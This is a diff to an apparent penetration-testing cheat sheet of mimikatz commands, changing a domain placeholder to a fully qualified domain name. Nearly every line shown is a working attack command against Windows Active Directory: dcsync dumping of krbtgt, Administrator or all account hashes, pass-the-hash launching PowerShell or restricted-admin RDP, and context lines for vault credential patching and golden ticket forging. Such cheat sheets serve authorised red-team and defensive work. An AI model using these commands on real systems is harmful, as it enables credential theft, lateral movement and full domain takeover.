@@ -26,12 +26,12 @@ mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
 
 ## dcsync - user (krbtgt/Administrator)
 ```
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /user:<user>" "exit"
 ```
 
 ## dcsync - all (krbtgt/Administrator)
 ```
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /all /csv" "exit"
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /all /csv" "exit"
 ```
 
 ## dump SAM - online
@@ -164,13 +164,13 @@ kerberos::golden /user:<user> /domain:<child_fqdn> /sid:<child_sid> /krbtgt:<krb
 #plateform/windows  #target/local  #cat/ATTACK/PTH 
 Followed by : Enter-PSSession -Computer {<}computer_name}
 ```
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
+sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:powershell
 ```
 
 ## pth to RDP
 #plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH
 ```
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
+sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
 % mimikatz, rdp
